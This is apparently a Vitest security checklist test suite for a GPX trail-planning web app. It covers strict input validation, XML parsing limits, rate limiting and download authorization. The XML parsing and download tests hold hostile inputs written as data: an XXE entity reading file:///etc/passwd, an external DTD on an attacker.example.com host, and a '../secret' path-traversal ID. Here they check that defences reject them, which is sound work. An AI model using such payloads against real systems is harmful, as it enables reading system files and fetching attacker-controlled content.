import { describe, it, expect, beforeEach, vi } from "vitest"
import { saveRouteAction, deleteRouteAction } from "@/app/actions/routes"
import { joinWaitlistAction } from "@/app/actions/waitlist"
import { fetchWeatherAction } from "@/app/actions/weather"
import { GET as downloadGpxGET } from "@/app/api/routes/[id]/gpx/route"
import { POST as authPOST } from "@/app/api/auth/[...all]/route"
import { extractGPX } from "@/lib/gpx/extract"
import {
  ERR_XML_ENTITY,
  ERR_GPX_TOO_LARGE,
  ERR_MAX_POINTS,
} from "@/lib/gpx/types"
import { GPX_BOUNDS, RATE_LIMITS } from "@/lib/entitlements/config"
import { setSessionForTesting } from "@/lib/auth"
import { setDbForTesting } from "@/lib/db/client"
import {
  createInMemoryStorage,
  _setStorageBackendForTesting,
} from "@/lib/storage"

const validGpx = `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="PlanYourTrail">
  <trk>
    <trkseg>
      <trkpt lat="-8.34" lon="116.45"><ele>1000</ele></trkpt>
      <trkpt lat="-8.35" lon="116.46"><ele>1200</ele></trkpt>
    </trkseg>
  </trk>
</gpx>`

describe("AGENTS.md Section 8: Security Checklist Verification", () => {
  beforeEach(() => {
    vi.clearAllMocks()
    setSessionForTesting(null)
    setDbForTesting(null)
    _setStorageBackendForTesting(createInMemoryStorage())
  })

  describe("1. Zod validation rejects unknown fields (.strict())", () => {
    it("saveRouteAction rejects unknown fields", async () => {
      setSessionForTesting({
        user: { id: "user-1", email: "u@test.com", plan: "free" },
      })

      const res = await saveRouteAction({
        name: "My Route",
        gpxContent: validGpx,
        isAdmin: true,
      })

      expect(res.ok).toBe(false)
      if (!res.ok) {
        expect(res.error.code).toBe("VALIDATION_ERROR")
      }
    })

    it("deleteRouteAction rejects unknown fields", async () => {
      setSessionForTesting({
        user: { id: "user-1", email: "u@test.com", plan: "free" },
      })

      const res = await deleteRouteAction({
        routeId: "a0000000-0000-4000-8000-000000000001",
        forceOtherUser: "user-2",
      })

      expect(res.ok).toBe(false)
      if (!res.ok) {
        expect(res.error.code).toBe("VALIDATION_ERROR")
      }
    })

    it("joinWaitlistAction rejects unknown fields", async () => {
      setSessionForTesting({
        user: { id: "user-1", email: "u@test.com", plan: "free" },
      })

      const res = await joinWaitlistAction({
        feature: "export_pdf",
        userId: "spoofed-user-id",
      })

      expect(res.ok).toBe(false)
      if (!res.ok) {
        expect(res.error.code).toBe("VALIDATION_ERROR")
      }
    })

    it("fetchWeatherAction rejects unknown fields", async () => {
      const res = await fetchWeatherAction({
        lat: -8.4,
        lon: 116.4,
        date: "2026-10-30",
        bypassRateLimit: true,
      })

      expect(res.ok).toBe(false)
      if (!res.ok) {
        expect(res.error.code).toBe("VALIDATION_ERROR")
      }
    })
  })

  describe("2. GPX parsing bounds (size, point count, no external entity resolution)", () => {
    it("rejects XML containing <!ENTITY declarations (XXE / Billion Laughs)", () => {
      const xxeGpx = `<?xml version="1.0"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<gpx version="1.1">
  <trk><trkseg>
    <trkpt lat="-8.34" lon="116.45"><ele>1000</ele></trkpt>
    <trkpt lat="-8.35" lon="116.46"><ele>1200</ele></trkpt>
  </trkseg></trk>
</gpx>`

      expect(() => extractGPX(xxeGpx)).toThrow(ERR_XML_ENTITY)
    })

    it("rejects XML containing external SYSTEM DTD", () => {
      const externalDtdGpx = `<?xml version="1.0"?>
<!DOCTYPE gpx SYSTEM "http://attacker.example.com/evil.dtd">
<gpx version="1.1">
  <trk><trkseg>
    <trkpt lat="-8.34" lon="116.45"><ele>1000</ele></trkpt>
    <trkpt lat="-8.35" lon="116.46"><ele>1200</ele></trkpt>
  </trkseg></trk>
</gpx>`

      expect(() => extractGPX(externalDtdGpx)).toThrow(ERR_XML_ENTITY)
    })

    it("rejects GPX string exceeding GPX_BOUNDS.maxParseBytes (20 MB)", () => {
      const oversized =
        `<gpx><trk><trkseg>` +
        "a".repeat(GPX_BOUNDS.maxParseBytes + 100) +
        `</trkseg></trk></gpx>`

      expect(() => extractGPX(oversized)).toThrow(ERR_GPX_TOO_LARGE)
    })

    it("rejects GPX exceeding GPX_BOUNDS.maxWaypoints (1,000 waypoints)", () => {
      const tooManyWpts = Array.from(
        { length: GPX_BOUNDS.maxWaypoints + 5 },
        (_, i) => `<wpt lat="-8.${i}" lon="116.4"><name>WP ${i}</name></wpt>`
      ).join("")

      const gpx = `<gpx version="1.1">${tooManyWpts}<trk><trkseg><trkpt lat="-8.34" lon="116.45"/><trkpt lat="-8.35" lon="116.46"/></trkseg></trk></gpx>`

      expect(() => extractGPX(gpx)).toThrow(ERR_MAX_POINTS)
    })
  })

  describe("3. Rate limiting on saveRouteAction, auth POST, and GPX download", () => {
    it("saveRouteAction returns RATE_LIMITED when user exceeds saveRoutePerHour", async () => {
      setSessionForTesting({
        user: { id: "user-123", email: "user@test.com", plan: "free" },
      })

      const mockLimit = vi.fn().mockResolvedValue([
        {
          key: "route_save:user-123",
          windowStart: new Date(),
          count: RATE_LIMITS.saveRoutePerHour,
        },
      ])
      const mockWhere = vi.fn().mockReturnValue({ limit: mockLimit })
      const mockFrom = vi.fn().mockReturnValue({ where: mockWhere })
      const mockSelect = vi.fn().mockReturnValue({ from: mockFrom })

      setDbForTesting({
        select: mockSelect,
      } as unknown as Parameters<typeof setDbForTesting>[0])

      const res = await saveRouteAction({
        name: "Rate Limited Route",
        gpxContent: validGpx,
      })

      expect(res.ok).toBe(false)
      if (!res.ok) {
        expect(res.error.code).toBe("RATE_LIMITED")
      }
    })

    it("POST /api/auth/[...all] returns 429 when IP exceeds authPerMinute", async () => {
      const mockLimit = vi.fn().mockResolvedValue([
        {
          key: "auth:post:203.0.113.10",
          windowStart: new Date(),
          count: RATE_LIMITS.authPerMinute,
        },
      ])
      const mockWhere = vi.fn().mockReturnValue({ limit: mockLimit })
      const mockFrom = vi.fn().mockReturnValue({ where: mockWhere })
      const mockSelect = vi.fn().mockReturnValue({ from: mockFrom })

      setDbForTesting({
        select: mockSelect,
      } as unknown as Parameters<typeof setDbForTesting>[0])

      const req = new Request("http://localhost:3000/api/auth/sign-in/email", {
        method: "POST",
        headers: {
          "x-forwarded-for": "203.0.113.10",
          "content-type": "application/json",
        },
        body: JSON.stringify({ email: "a@b.com", password: "password123" }),
      })

      const res = await authPOST(req)
      expect(res.status).toBe(429)
    })

    it("GET /api/routes/[id]/gpx rejects path-traversal IDs with 400 and mismatched object keys with 403", async () => {
      setSessionForTesting({
        user: { id: "user-123", email: "user@test.com", plan: "free" },
      })

      // 1. Path traversal ID rejected by Zod
      const badReq = new Request(
        "http://localhost:3000/api/routes/..%2Fsecret/gpx"
      )
      const badRes = await downloadGpxGET(badReq, {
        params: Promise.resolve({ id: "../secret" }),
      })
      expect(badRes.status).toBe(400)

      // 2. Mismatched object key prefix rejected with 403
      const mockLimit = vi.fn().mockResolvedValue([
        {
          id: "route-123",
          userId: "user-123",
          name: "Tampered Route",
          gpxObjectKey: "gpx/other-user/route-123.gpx.gz",
          hidden: false,
        },
      ])
      const mockWhere = vi.fn().mockReturnValue({ limit: mockLimit })
      const mockFrom = vi.fn().mockReturnValue({ where: mockWhere })
      const mockSelect = vi.fn().mockReturnValue({ from: mockFrom })

      setDbForTesting({
        select: mockSelect,
      } as unknown as Parameters<typeof setDbForTesting>[0])

      const req = new Request("http://localhost:3000/api/routes/route-123/gpx")
      const res = await downloadGpxGET(req, {
        params: Promise.resolve({ id: "route-123" }),
      })
      expect(res.status).toBe(403)
    })
  })
})

